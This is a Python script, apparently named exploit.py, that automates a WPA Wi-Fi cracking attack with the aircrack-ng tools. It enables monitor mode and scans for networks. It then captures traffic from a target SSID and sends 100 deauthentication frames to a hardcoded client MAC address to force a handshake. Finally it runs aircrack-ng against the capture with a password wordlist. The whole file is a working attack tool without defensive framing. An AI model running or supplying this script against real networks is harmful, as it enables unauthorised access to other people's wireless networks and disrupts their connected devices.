import subprocess, sys, time, collections, json, csv, os, pathlib, shutil

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def find_wifi(interface):
    timeout = 10
    start_time = time.time()
    pathlib.Path(os.path.join(os.getcwd(), 'captures')).mkdir(exist_ok=True)
    airodump = subprocess.Popen(['sudo','airodump-ng', '-o', 'csv', '-w', os.path.join(os.getcwd(), "captures", ".out"), interface], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    table = collections.defaultdict(lambda: collections.defaultdict(str))
    while time.time() < start_time + timeout:
        continue
    airodump.terminate()
    has_labels = False
    end_of_search = False
    BSSID_index = -1
    ESSID_index = -1
    Privacy_index = -1
    channel_index = -1
    for (_, line) in  enumerate(csv.reader(open(os.path.join(os.getcwd(), "captures", '.out-01.csv'), 'r'), quotechar='"', delimiter=',', quoting=csv.QUOTE_ALL, skipinitialspace=True)):
        line = list(filter(None, line))
        if len(line) == 0:
            continue
        if not has_labels:
            has_labels = True
            array = [idx for idx, s in enumerate(line) if 'BSSID' in s]
            if len(array) != 0:
                BSSID_index = array[0]
            array = [idx for idx, s in enumerate(line) if 'ESSID' in s]
            if len(array) != 0:
                ESSID_index = array[0]
            array = [idx for idx, s in enumerate(line) if 'Privacy' in s]
            if len(array) != 0:
                Privacy_index = array[0]
            array = [idx for idx, s in enumerate(line) if 'channel' in s]
            if len(array) != 0:
                channel_index = array[0]
        elif not end_of_search:
            array = [idx for idx, s in enumerate(line) if 'Station MAC' in s]
            if len(array) != 0:
                end_of_search = True
                continue
            if len(line) > ESSID_index and len(line) > Privacy_index:
                table[line[ESSID_index]]["BSSID"] = line[BSSID_index]
                table[line[ESSID_index]]["ESSID"] = line[ESSID_index]
                table[line[ESSID_index]]["Privacy"] = line[Privacy_index]
                table[line[ESSID_index]]["Channel"] = line[channel_index]
    return table

def get_interface():
    result = subprocess.check_output(['sudo', 'airmon-ng']).decode("utf-8").split('\n')
    result = list(filter(None, result))
    labels = result[0].split()
    index = labels.index("Interface")
    return result[1].split()[index]

def exploit(network):
    sys.stdout.flush()
    sys.stdout.write(bcolors.OKBLUE + "Checking Dependencies        \r" + bcolors.ENDC)
    sys.stdout.flush()
    result = subprocess.run(['which', 'aircrack-ng'], capture_output=True, text=True).stdout
    if not result:
        print("Install aircrack-ng first")
        print("sudo apt-get install aircrack-ng")
        return
    sys.stdout.write(bcolors.OKBLUE + "Getting network interfaces       \r" + bcolors.ENDC)
    sys.stdout.flush()
    interface = get_interface()
    #subprocess.call(['sudo', 'airmon-ng', 'check', 'kill'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    sys.stdout.write(bcolors.OKBLUE + "Enabling Monitor Mode        \r" + bcolors.ENDC)
    sys.stdout.flush()
    subprocess.call(['sudo', 'airmon-ng', 'stop', interface + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    subprocess.call(['sudo', 'airmon-ng', 'start', interface], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    sys.stdout.write(bcolors.OKBLUE + "Scanning For Network         \r" + bcolors.ENDC)
    sys.stdout.flush()
    network_database = find_wifi(interface + "mon")    
    
    # NB: this attack is more effective when targeting
    # a connected wireless client (-c <client's mac>).
    airodump = subprocess.Popen(['sudo', 'airodump-ng', '--bssid', network_database[network]["BSSID"], '-c', network_database[network]["Channel"], '--write', os.path.join(os.getcwd(), "captures",'WPAcrack'), interface + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    sys.stdout.write(bcolors.OKBLUE + "Deauthenticating Target        \r" + bcolors.ENDC)
    sys.stdout.flush()

    subprocess.call(['sudo', 'aireplay-ng', '--deauth', '100', '-c', '94:BF:2D:88:91:54', '-a', network_database[network]["BSSID"], interface + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    
    try:
        sys.stdout.write(bcolors.OKBLUE + "Monitoring Target Network        \r" + bcolors.ENDC)
        sys.stdout.flush()
        airodump.wait(timeout=30)
        
    except subprocess.TimeoutExpired:
        sys.stdout.write(bcolors.OKBLUE + "Attempting to crack hash        \r" + bcolors.ENDC)
        sys.stdout.flush()
    subprocess.call(['sudo', 'aircrack-ng', os.path.join(os.getcwd(), "captures", 'WPAcrack-01.cap'), '-w', '/usr/share/wordlists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt'])
    time.sleep(1)
    sys.stdout.write(bcolors.OKBLUE + "Disabling Monitor Mode \r" + bcolors.ENDC)
    sys.stdout.flush()
    subprocess.call(['sudo', 'airmon-ng', 'stop', interface + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    sys.stdout.write("\n")
    sys.stdout.flush()
    #try:
    #    shutil.rmtree(os.path.join(os.getcwd(), "captures"))
    #except OSError as e:
    #    print ("Error: %s - %s." % (e.filename, e.strerror))

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("usage: python3 exploit.py network_ssid")
        exit(1)
    else:
        exploit(sys.argv[1])
